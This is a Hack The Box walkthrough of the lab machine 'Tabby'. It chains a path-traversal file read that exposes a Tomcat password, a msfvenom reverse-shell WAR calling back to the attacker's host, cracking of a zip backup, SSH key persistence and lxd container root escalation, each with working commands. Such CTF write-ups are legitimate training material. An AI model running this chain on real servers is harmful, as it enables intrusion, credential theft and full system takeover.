# Box 



![tabby](img/Screenshot_2020-12-24_17-30-24.png)

https://www.hackthebox.eu/home/machines/profile/259

# Profile

 <img src="http://www.hackthebox.eu/badge/image/296177" alt="Hack The Box"> 

https://www.hackthebox.eu/home/users/profile/296177

# Table of Contents

* [Enumeration](#enumeration)
* [Exploitation](#exploitation)
* [Post-Exploitation](#post-exploitation)
  + [User](#user)
  + [Root](#root)

# Contents 



## Enumeration

Let's start with nmap : 

```bash
nmap -sC -oN scan -sV 10.10.10.194
```

![image-20201226110226334](img/image-20201226110226334.png)

I found a web page where you can do a LFI  http://10.10.10.194/news.php?file=../../../../../etc/passwd

![image-20201226110455401](img/image-20201226110455401.png)

After reading documentation, we can now search for tomcat users : http://10.10.10.194/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml 

If you look in the source code page you can see : 

```xml
<user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
```

I find a way to upload a payload : 


 	http://10.10.10.194:8080/manager/text/deploy?path

![image-20201226111814716](img/image-20201226111814716.png)

We can also see ths list of payload available  : http://10.10.10.194:8080/manager/text/list
![image-20201226111858954](img/image-20201226111858954.png)

##  Exploitation

Let's make our own payload to get a reverse_shell  :

```bash
msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.28 LPORT=4444 -f war -o payload.war
```



We upload the file thanks to curl :

```bash
curl -v -u tomcat:\$3cureP4s5w0rd123! --upload-file payload.war  "http://10.10.10.194:8080/manager/text/deploy?path=/payload&update=true"
```

Let's setup nc to receive our shell : 

![image-20201226112207834](img/image-20201226112207834.png)

Activate it :

```
http://10.10.10.194:8080/payload
```

We now get our reverse shell :

![image-20201226112345734](img/image-20201226112345734.png)

## Post-Exploitation

### User

Let's upgrade it, I found python on the machine so we can use :

```bash
/usr/bin/python3.8 -c 'import pty; pty.spawn("/bin/bash")'
```

![image-20201226112757221](img/image-20201226112757221.png)


I found the file /var/www/html/files/16162020_backup.zip whch is password protected I decided to download it on my local machine 

![image-20201226113149055](img/image-20201226113149055.png)

Let's setup a python server to download the file : 

```bash
python3.8 -m http.server 4445
```

![image-20201226113512097](img/image-20201226113512097.png)

on our machine : 

```bash
wget http://10.10.10.194:4445/16162020_backup.zip
```

![image-20201226113550788](img/image-20201226113550788.png)

Let's crack it with the rockyou.txt wordlist :

```bash
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' 16162020_backup.zip
```

we get password : 

![image-20201226113833467](img/image-20201226113833467.png)



We can know get to the user ash in ssh.

![image-20201226114208147](img/image-20201226114208147.png)

We now have our user.txt hash. 

I will now add my ssh pub key to the authorized_keys file of ash.

![image-20201226114432079](img/image-20201226114432079.png)

### Root

Let's enumerate the machine thanks to LinPEAS.

After enumeration, we can see we are part of the lxd group :

![image-20201226114721124](img/image-20201226114721124.png)

We can create a container where we have root access, here is the link to the exploit https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation.

We first need to upload an alpine builder :

```bash
wget http://10.10.14.28:4444/alpine-v3.12-x86_64-20201031_1515.tar.gz
```

![image-20201226115611008](img/image-20201226115611008.png)

Let's import our image : 

```bash
lxc image import ./alpine-v3.12-x86_64-20201031_1515.tar.gz 
```

![image-20201226115921228](img/image-20201226115921228.png)

I created an alias to give it a name : 

![image-20201226120129775](img/image-20201226120129775.png)

Now configuration : 

```bash
lxc init htb privesc -c security.privileged=true
lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
```

Execution : 

```bash
lxc start privesc
lxc exec privesc /bin/sh
```


Rooted.

![image-20201226120313901](img/image-20201226120313901.png)






